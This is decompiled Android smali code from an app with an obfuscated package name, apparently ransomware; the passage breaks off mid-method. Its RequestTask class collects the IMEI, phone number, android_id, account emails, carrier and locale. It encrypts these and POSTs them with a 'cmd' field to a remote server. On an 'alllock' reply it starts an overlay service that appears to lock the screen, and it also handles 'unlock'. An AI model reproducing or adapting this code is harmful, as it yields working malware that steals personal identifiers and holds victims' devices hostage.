.class Lbi/gemolay/sntareson/RequestTask;
.super Landroid/os/AsyncTask;
.source "RequestTask.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field private mContext:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 42
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 43
    iput-object p1, p0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    .line 46
    return-void
.end method

.method private capitalize(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "s"    # Ljava/lang/String;

    .prologue
    .line 59
    if-eqz p1, :cond_0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v1

    if-nez v1, :cond_2

    .line 60
    :cond_0
    const-string p1, ""

    .line 66
    .end local p1    # "s":Ljava/lang/String;
    :cond_1
    :goto_0
    return-object p1

    .line 62
    .restart local p1    # "s":Ljava/lang/String;
    :cond_2
    const/4 v1, 0x0

    invoke-virtual {p1, v1}, Ljava/lang/String;->charAt(I)C

    move-result v0

    .line 63
    .local v0, "first":C
    invoke-static {v0}, Ljava/lang/Character;->isUpperCase(C)Z

    move-result v1

    if-nez v1, :cond_1

    .line 66
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/Character;->toUpperCase(C)C

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v2, 0x1

    invoke-virtual {p1, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_0
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lbi/gemolay/sntareson/RequestTask;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 39
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    .line 76
    :try_start_0
    new-instance v18, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct/range {v18 .. v18}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 77
    .local v18, "hc":Lorg/apache/http/impl/client/DefaultHttpClient;
    new-instance v26, Lorg/apache/http/impl/client/BasicResponseHandler;

    invoke-direct/range {v26 .. v26}, Lorg/apache/http/impl/client/BasicResponseHandler;-><init>()V

    .line 79
    .local v26, "res":Lorg/apache/http/client/ResponseHandler;, "Lorg/apache/http/client/ResponseHandler<Ljava/lang/String;>;"
    new-instance v25, Lorg/apache/http/client/methods/HttpPost;

    const/16 v34, 0x0

    aget-object v34, p1, v34

    move-object/from16 v0, v25

    move-object/from16 v1, v34

    invoke-direct {v0, v1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 81
    .local v25, "postMethod":Lorg/apache/http/client/methods/HttpPost;
    new-instance v23, Ljava/util/ArrayList;

    const/16 v34, 0x2

    move-object/from16 v0, v23

    move/from16 v1, v34

    invoke-direct {v0, v1}, Ljava/util/ArrayList;-><init>(I)V

    .line 84
    .local v23, "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    const-string v33, "n/a"

    .line 85
    .local v33, "typenet":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v35, "connectivity"

    invoke-virtual/range {v34 .. v35}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/net/ConnectivityManager;

    .line 86
    .local v8, "cm":Landroid/net/ConnectivityManager;
    invoke-virtual {v8}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v5

    .line 88
    .local v5, "activeNetwork":Landroid/net/NetworkInfo;
    invoke-virtual {v5}, Landroid/net/NetworkInfo;->getType()I

    move-result v34

    if-nez v34, :cond_8

    const/16 v20, 0x1

    .line 89
    .local v20, "isMobile":Z
    :goto_0
    const/16 v34, 0x1

    move/from16 v0, v34

    invoke-virtual {v8, v0}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v34

    .line 90
    invoke-virtual/range {v34 .. v34}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v21

    .line 91
    .local v21, "isWifi":Z
    if-eqz v20, :cond_0

    .line 92
    const-string v33, "mobile"

    .line 94
    :cond_0
    if-eqz v21, :cond_1

    .line 95
    const-string v33, "wifi"

    .line 97
    :cond_1
    const-string v16, ""

    .line 98
    .local v16, "email":Ljava/lang/String;
    sget-object v17, Landroid/util/Patterns;->EMAIL_ADDRESS:Ljava/util/regex/Pattern;

    .line 99
    .local v17, "emailPattern":Ljava/util/regex/Pattern;
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    invoke-static/range {v34 .. v34}, Landroid/accounts/AccountManager;->get(Landroid/content/Context;)Landroid/accounts/AccountManager;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Landroid/accounts/AccountManager;->getAccounts()[Landroid/accounts/Account;

    move-result-object v4

    .line 100
    .local v4, "accounts":[Landroid/accounts/Account;
    array-length v0, v4

    move/from16 v35, v0

    const/16 v34, 0x0

    :goto_1
    move/from16 v0, v34

    move/from16 v1, v35

    if-lt v0, v1, :cond_9

    .line 106
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v35, "cocon"

    const/16 v36, 0x0

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v30

    .line 107
    .local v30, "settings3":Landroid/content/SharedPreferences;
    const-string v34, "status"

    const/16 v35, 0x0

    move-object/from16 v0, v30

    move-object/from16 v1, v34

    move/from16 v2, v35

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v31

    .line 108
    .local v31, "status":I
    const-string v34, "camera"

    const/16 v35, 0x0

    move-object/from16 v0, v30

    move-object/from16 v1, v34

    move/from16 v2, v35

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v7

    .line 109
    .local v7, "camera":I
    const-string v34, "pcode"

    const-string v35, "null"

    move-object/from16 v0, v30

    move-object/from16 v1, v34

    move-object/from16 v2, v35

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 110
    .local v9, "code":Ljava/lang/String;
    const-string v10, ""

    .line 111
    .local v10, "data":Ljava/lang/String;
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v35, v0

    invoke-virtual/range {v35 .. v35}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v35

    const-string v36, "android_id"

    invoke-static/range {v35 .. v36}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 112
    new-instance v35, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v34

    move-object/from16 v0, v35

    move-object/from16 v1, v34

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v36, "phone"

    move-object/from16 v0, v34

    move-object/from16 v1, v36

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v34

    check-cast v34, Landroid/telephony/TelephonyManager;

    invoke-virtual/range {v34 .. v34}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v34

    move-object/from16 v0, v35

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 113
    new-instance v35, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v34

    move-object/from16 v0, v35

    move-object/from16 v1, v34

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v36, "phone"

    move-object/from16 v0, v34

    move-object/from16 v1, v36

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v34

    check-cast v34, Landroid/telephony/TelephonyManager;

    invoke-virtual/range {v34 .. v34}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v34

    move-object/from16 v0, v35

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 114
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {p0 .. p0}, Lbi/gemolay/sntareson/RequestTask;->getDeviceName()Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 115
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v35, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 116
    new-instance v35, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v34

    move-object/from16 v0, v35

    move-object/from16 v1, v34

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v36, "phone"

    move-object/from16 v0, v34

    move-object/from16 v1, v36

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v34

    check-cast v34, Landroid/telephony/TelephonyManager;

    invoke-virtual/range {v34 .. v34}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v34

    move-object/from16 v0, v35

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 117
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    move-object/from16 v1, v33

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 118
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 119
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v35, v0

    invoke-virtual/range {v35 .. v35}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v35

    invoke-virtual/range {v35 .. v35}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v35

    move-object/from16 v0, v35

    iget-object v0, v0, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    move-object/from16 v35, v0

    invoke-virtual/range {v35 .. v35}, Ljava/util/Locale;->getCountry()Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 120
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static/range {v31 .. v31}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 121
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 122
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    const-string v35, ":-:"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 123
    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v35, 0x2

    aget-object v35, p1, v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 124
    new-instance v22, Lbi/gemolay/sntareson/MCrypt;

    invoke-direct/range {v22 .. v22}, Lbi/gemolay/sntareson/MCrypt;-><init>()V

    .line 125
    .local v22, "mcrypt":Lbi/gemolay/sntareson/MCrypt;
    move-object/from16 v0, v22

    invoke-virtual {v0, v10}, Lbi/gemolay/sntareson/MCrypt;->encrypt(Ljava/lang/String;)[B

    move-result-object v34

    invoke-static/range {v34 .. v34}, Lbi/gemolay/sntareson/MCrypt;->bytesToHex([B)Ljava/lang/String;

    move-result-object v11

    .line 126
    .local v11, "data2":Ljava/lang/String;
    const-string v6, ""
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 127
    .local v6, "base64":Ljava/lang/String;
    const/4 v12, 0x0

    .line 129
    .local v12, "data3":[B
    :try_start_1
    const-string v34, "UTF-8"

    move-object/from16 v0, v34

    invoke-virtual {v11, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v12

    .line 133
    :goto_2
    const/16 v34, 0x0

    :try_start_2
    move/from16 v0, v34

    invoke-static {v12, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v6

    .line 135
    new-instance v35, Lorg/apache/http/message/BasicNameValuePair;

    const-string v36, "imei"

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v34, "#"

    move-object/from16 v0, v37

    move-object/from16 v1, v34

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v38, "phone"

    move-object/from16 v0, v34

    move-object/from16 v1, v38

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v34

    check-cast v34, Landroid/telephony/TelephonyManager;

    invoke-virtual/range {v34 .. v34}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v34

    move-object/from16 v0, v37

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v34

    move-object/from16 v0, v35

    move-object/from16 v1, v36

    move-object/from16 v2, v34

    invoke-direct {v0, v1, v2}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v23

    move-object/from16 v1, v35

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 136
    new-instance v34, Lorg/apache/http/message/BasicNameValuePair;

    const-string v35, "cmd"

    const/16 v36, 0x1

    aget-object v36, p1, v36

    invoke-direct/range {v34 .. v36}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v23

    move-object/from16 v1, v34

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 137
    new-instance v34, Lorg/apache/http/message/BasicNameValuePair;

    const-string v35, "sub"

    const-string v36, "13"

    invoke-direct/range {v34 .. v36}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v23

    move-object/from16 v1, v34

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 138
    new-instance v34, Lorg/apache/http/message/BasicNameValuePair;

    const-string v35, "data"

    move-object/from16 v0, v34

    move-object/from16 v1, v35

    invoke-direct {v0, v1, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    move-object/from16 v0, v23

    move-object/from16 v1, v34

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 140
    new-instance v34, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    move-object/from16 v0, v34

    move-object/from16 v1, v23

    invoke-direct {v0, v1}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    move-object/from16 v0, v25

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 142
    move-object/from16 v0, v18

    move-object/from16 v1, v25

    move-object/from16 v2, v26

    invoke-virtual {v0, v1, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;Lorg/apache/http/client/ResponseHandler;)Ljava/lang/Object;

    move-result-object v27

    check-cast v27, Ljava/lang/String;

    .line 143
    .local v27, "response":Ljava/lang/String;
    invoke-virtual/range {v27 .. v27}, Ljava/lang/String;->length()I

    move-result v34

    const/16 v35, 0x3

    move/from16 v0, v34

    move/from16 v1, v35

    if-le v0, v1, :cond_7

    .line 146
    const-string v34, "alllock"

    move-object/from16 v0, v27

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v34

    if-eqz v34, :cond_2

    .line 148
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v35, "cocon"

    const/16 v36, 0x0

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    .line 149
    .local v28, "settings":Landroid/content/SharedPreferences;
    invoke-interface/range {v28 .. v28}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    .line 150
    .local v15, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v34, "status"

    const/16 v35, 0x0

    move-object/from16 v0, v34

    move/from16 v1, v35

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 151
    const-string v34, "animation"

    const/16 v35, 0x0

    move-object/from16 v0, v34

    move/from16 v1, v35

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 152
    const-string v34, "pcode"

    const-string v35, ""

    move-object/from16 v0, v34

    move-object/from16 v1, v35

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 153
    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 154
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    new-instance v35, Landroid/content/Intent;

    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v36, v0

    const-class v37, Lbi/gemolay/sntareson/OverlayService;

    invoke-direct/range {v35 .. v37}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual/range {v34 .. v35}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 157
    .end local v15    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v28    # "settings":Landroid/content/SharedPreferences;
    :cond_2
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v35, "cocon"

    const/16 v36, 0x0

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v29

    .line 159
    .local v29, "settings2":Landroid/content/SharedPreferences;
    const-string v34, "status"

    const/16 v35, 0x0

    move-object/from16 v0, v29

    move-object/from16 v1, v34

    move/from16 v2, v35

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v32

    .line 160
    .local v32, "status2":I
    const/16 v34, 0x4d

    move/from16 v0, v32

    move/from16 v1, v34

    if-ne v0, v1, :cond_3

    .line 161
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v34

    invoke-static/range {v34 .. v34}, Landroid/os/Process;->killProcess(I)V

    .line 163
    :cond_3
    const-string v34, "unlock"

    move-object/from16 v0, v27

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v34

    if-eqz v34, :cond_4

    .line 165
    move-object/from16 v0, p0

    iget-object v0, v0, Lbi/gemolay/sntareson/RequestTask;->mContext:Landroid/content/Context;

    move-object/from16 v34, v0

    const-string v35, "cocon"

    const/16 v36, 0x0

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    .line 166
